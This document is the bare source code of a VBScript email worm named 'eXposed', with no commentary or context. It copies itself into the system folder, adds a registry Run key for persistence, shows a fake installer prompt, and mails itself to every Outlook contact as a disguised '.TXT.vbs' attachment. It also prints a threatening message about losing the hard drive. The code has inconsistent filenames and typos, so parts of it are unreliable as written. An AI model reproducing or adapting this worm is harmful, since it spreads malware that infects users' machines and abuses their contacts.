On Error Resume Next
Dim fso,dirsystem,file,vbscopy,dow,reg,FileLoc,MakeCopy,Lists,a,x,RegLists,Entries,Addresses,RegAddress,Mail
Set fso = CreateObject("Scripting.FileSystemObject")
Set reg = CreateObject("WScript.Shell")
Set dirsystem = fso.GetSpecialFolder(1)
Set file = fso.OpenTextFile(WScript.ScriptFullname,1)
Set MakeCopy = fso.GetFile(WScript.ScriptFullName)
Set OutLook=WScript.CreateObject("Outlook.Application")
Set mapi=OutLook.GetNameSpace("MAPI")
vbscopy=file.ReadAll
MakeCopy.Copy(dirsystem&"\Prinz_Charles_Are_Die.TXT.vbs")
FileLoc = dirsystem&"\Prinz_Charles.Are.Die.TXT.vbs"
reg.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\Prinz_Charles_Are_Die", FileLoc
L_Welcome_MsgBox_Message_Text   = "eXposed is being installed"
L_Welcome_MsgBox_Title_Text     = "eXposed"
Call Welcome()
Dim WSHShell
Set WSHShell = WScript.CreateObject("WScript.Shell")
Dim MyShortcut, MyDesktop, DesktopPath
DesktopPath = WSHShell.SpecialFolders("Desktop")
Set MyShortcut = WSHShell.CreateShortcut(DesktopPath & "\eXposed.lnk")
MyShortcut.TargetPath = WSHShell.ExpandEnvironmentStrings("windows\exit to dos")
MyShortcut.WorkingDirectory = WSHShell.ExpandEnvironmentStrings("%windir%")
MyShortcut.WindowStyle = 4
MyShortcut.IconLocation = WSHShell.ExpandEnvironmentStrings("C:\Program Files\Plus!\Themes\Lucky2000.ico, 0")
MyShortcut.Save
MYShortcut.Save
MYShortcut.Save 
MYShortcut.Save
MYShortcut.Save
MYShortcut.Save
MYShortcut.Save
MYShortcut.Save
WScript.Echo "CLICK THE BLUE BOTTLE ICON ON THE DESKTOP OR YOUR HARD DRIVE WILL BE LOST!                       eXposed IS A VIRUS IT WILL DAMAGE YOUR COMPUTER"
For Lists=1 to mapi.AddressLists.Count
Set a=mapi.AddressLists(Lists)
x=1
RegLists=reg.RegRead("HKEY_CURRENT_USER\Software\Microsoft\WAB\"&a)
If (RegLists="") then
RegLists=1
End if
If (int(a.AddressEntries.Count)>int(RegLists)) then
For Entries=1 to a.AddressEntries.Count
Addresses=a.AddressEntries(x)
RegAddress=""
RegAddress=reg.RegRead("HKEY_CURRENT_USER\Software\Microsoft\WAB\"&Addresses)
If (RegAddresses="") then
Set Mail=OutLook.CreateItem(0)
Mail.Recipients.Add(Addresses)
Mail.Subject = "Prinz Charles Are Die"
Mail.Body = vbcrlf & "The newest Message for Cool User's."& vbcrlf & "Lucky2000"
Mail.Attachments.Add(dirsystem&"\COOL_NOTEPAD_DEMO.TXT.vbs")
Mail.Send
reg.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\"&Addresses,1,"REG_DWORD"
End if
x=x+1
Next
reg.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\"&a,a.AddressEntries.Count
Else
reg.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\"&a,a.AddressEntries.Count
End if
Next
Set OutLook=Nothing
Set mapi=Nothing
Sub Welcome()
    Dim intDoIt

    intDoIt =  MsgBox(L_Welcome_MsgBox_Message_Text,    _
                      vbOKCancel + vbInformation,       _
                      L_Welcome_MsgBox_Title_Text )
    If intDoIt = vbCancel Then
        WScript.Quit
End Sub